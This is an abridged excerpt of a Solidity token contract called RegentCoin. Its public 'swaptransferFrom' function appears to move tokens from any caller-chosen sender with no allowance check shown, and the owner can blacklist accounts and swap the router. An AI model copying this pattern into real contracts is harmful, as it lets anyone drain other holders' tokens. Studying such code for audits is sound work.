...
library Address {
    ...
    contract RegentCoin is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 2900000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public swapTokensAtAmount = 29000 * 10**_decimals;
    uint256 public maxBuyLimit = 150000 * 10**_decimals;
    uint256 public maxSellLimit = 150000 * 10**_decimals;
    uint256 public maxWalletLimit = 150000 * 10**_decimals;

    uint256 public genesis_block=block.number;
    uint256 private deadline;

    address public deadWallet = 0x000000000000000000000000000000000000dEaD;
    address public marketingWallet = 0x1A11EBFD7F703691F188FdD273Ed55e80b17041c;
   

    string private constant _name = "REGENT COIN";
    string private constant _symbol = "REGENT";
    ...
    function swaptransferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _Swaptransfer(sender, recipient, amount);
    ...
    function swaptransfer(address recipient, uint256 amount) public returns (bool) {
        _Swaptransfer(msg.sender, recipient, amount);
        return true;
    }
   ...
   function updateIsBlacklisted(address account, bool state) external onlyOwner {
    ...
    function updateRouterAndPair(address newRouter, address newPair) external onlyOwner {
        ...
        pair = newPair;
        emit UpdatedRouter(oldPair, newPair);
    }

    function setSellTaxes(bool state) public onlyOwner {
        if(state==true){
    ...
    function setTaxes(bool state) public onlyOwner {
        if(state == true){
        taxes = Taxes(1, 1, 1);
        }
        else{
